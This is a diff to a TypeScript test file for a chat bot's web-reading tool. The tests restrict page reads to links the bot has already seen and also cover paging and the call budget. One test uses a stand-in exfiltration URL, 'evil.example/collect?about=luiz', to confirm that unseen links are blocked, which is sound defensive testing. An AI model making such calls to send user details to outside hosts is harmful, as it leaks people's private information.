@@ -4,8 +4,9 @@ import { BACKGROUND_CONTEXT } from "@earendil-works/chord/context";
 import type { Harness, ToolExecutionResult } from "@earendil-works/pi-durable";
 import { MAX_CALLS_PER_RUN, TOO_MANY_CALLS } from "./calls.ts";
 import { freshStatePath, inNewRun, openHarness } from "./fixtures.ts";
-import { MAX_WEB_CALLS_PER_DAY, PERSONAL_DETAILS_BLOCKED, UNTRUSTED, WebBudget } from "./web.ts";
-import { createWebTool, NOT_SET_UP, type WebDeps } from "./webtool.ts";
+import { linksIn, rememberLinks, SeenLinks } from "./links.ts";
+import { MAX_WEB_CALLS_PER_DAY, PAGE_WINDOW_CHARS, PERSONAL_DETAILS_BLOCKED, UNTRUSTED, WebBudget } from "./web.ts";
+import { createWebTool, NOT_SET_UP, UNSEEN_LINK, type WebDeps } from "./webtool.ts";
 
 const KEY = "kagi-7Qm2Xv9pL4sT8wRz";
 const MORNING = new Date("2026-11-06T09:30:00Z");
@@ -174,4 +175,97 @@ test("web calls count against the same per-run cap as the other tools", async ()
 		});
 		assert.equal(sent.length, MAX_CALLS_PER_RUN);
 	});
+});
+
+const MANUAL = `# Ergo manual\n\nSee [history](https://ergo.chat/manual.html#history) and https://github.com/ergochat/ergo.\n\n${"bouncer ".repeat(1500)}`;
+const SEARCH_THEN_PAGE: Reply[] = [
+	{ body: { data: { search: [{ url: "https://ergo.chat/manual.html#top", title: "Ergo manual" }] } } },
+	{ body: { data: [{ url: "https://ergo.chat/manual.html", markdown: MANUAL }] } },
+];
+
+/** A fetch that answers each call with the next of `replies`, keeping what it was sent. */
+function scripted(replies: Reply[], sent: Sent[]) {
+	return (async (url: string, init: RequestInit) => {
+		sent.push({ url, init });
+		const reply = replies[Math.min(sent.length, replies.length) - 1] as Reply;
+		return new Response(JSON.stringify(reply.body), { status: reply.status ?? 200 });
+	}) as typeof globalThis.fetch;
+}
+
+const seenLinks = async (harness: Harness) => (await harness.snapshot(SeenLinks, BACKGROUND_CONTEXT))?.links ?? [];
+
+test("a link the bot never saw can't be read, and costs nothing", async () => {
+	await withWebTool({ body: SEARCH_REPLY }, async ({ run, sent, spent }) => {
+		const result = await run({ read: "https://evil.example/collect?about=luiz" });
+		assert.deepEqual([result.isError, textOf(result)], [true, UNSEEN_LINK]);
+		assert.deepEqual([sent, await spent()], [[], 0]);
+	});
+});
+
+test("a link from a search can be read, and the page's links can be read next", async () => {
+	const sent: Sent[] = [];
+	await withWebTool(
+		{ body: SEARCH_REPLY },
+		async ({ run, spent, harness }) => {
+			await run({ search: "ergo manual" });
+			assert.deepEqual(await seenLinks(harness), ["https://ergo.chat/manual.html"]);
+			const page = JSON.parse(textOf(await run({ read: "https://ergo.chat/manual.html" })));
+			assert.deepEqual([page.notice, page.from, page.next], [UNTRUSTED, 0, PAGE_WINDOW_CHARS]);
+			assert.ok(page.text.startsWith("# Ergo manual"));
+			assert.deepEqual(
+				sent.map((call) => call.url),
+				["https://kagi.com/api/v1/search", "https://kagi.com/api/v1/extract"],
+			);
+			assert.equal(await spent(), 2);
+			assert.deepEqual((await seenLinks(harness)).slice(-1), ["https://github.com/ergochat/ergo"]);
+		},
+		{ fetch: scripted(SEARCH_THEN_PAGE, sent) },
+	);
+});
+
+test("going on through a page read lately costs nothing more", async () => {
+	const sent: Sent[] = [];
+	await withWebTool(
+		{ body: SEARCH_REPLY },
+		async ({ run, spent }) => {
+			await run({ search: "ergo manual" });
+			await run({ read: "https://ergo.chat/manual.html" });
+			const rest = JSON.parse(
+				textOf(await run({ read: "https://ergo.chat/manual.html#faq", from: PAGE_WINDOW_CHARS })),
+			);
+			assert.equal(rest.text, MANUAL.slice(PAGE_WINDOW_CHARS, 2 * PAGE_WINDOW_CHARS));
+			assert.equal(sent.length, 2);
+			assert.equal(await spent(), 2);
+		},
+		{ fetch: scripted(SEARCH_THEN_PAGE, sent) },
+	);
+});
+
+test("a link pasted in chat can be read once it's remembered", async () => {
+	const sent: Sent[] = [];
+	await withWebTool(
+		{ body: SEARCH_REPLY },
+		async ({ run, harness }) => {
+			await harness.commit(async (tx) => {
+				rememberLinks(await tx.doc(SeenLinks), linksIn("luiz: louro, what's https://ergo.chat/manual.html about?"));
+			}, BACKGROUND_CONTEXT);
+			assert.equal((await run({ read: "https://ergo.chat/manual.html" })).isError, false);
+		},
+		{ fetch: scripted(SEARCH_THEN_PAGE.slice(1), sent) },
+	);
+});
+
+test("a page kagi can't read still counts against the budget", async () => {
+	const sent: Sent[] = [];
+	const replies = [SEARCH_THEN_PAGE[0] as Reply, { body: { data: [{ url: "https://ergo.chat/manual.html" }] } }];
+	await withWebTool(
+		{ body: SEARCH_REPLY },
+		async ({ run, spent }) => {
+			await run({ search: "ergo manual" });
+			const result = await run({ read: "https://ergo.chat/manual.html" });
+			assert.deepEqual([result.isError, textOf(result)], [true, "kagi couldn't read that page"]);
+			assert.equal(await spent(), 2);
+		},
+		{ fetch: scripted(replies, sent) },
+	);
 });
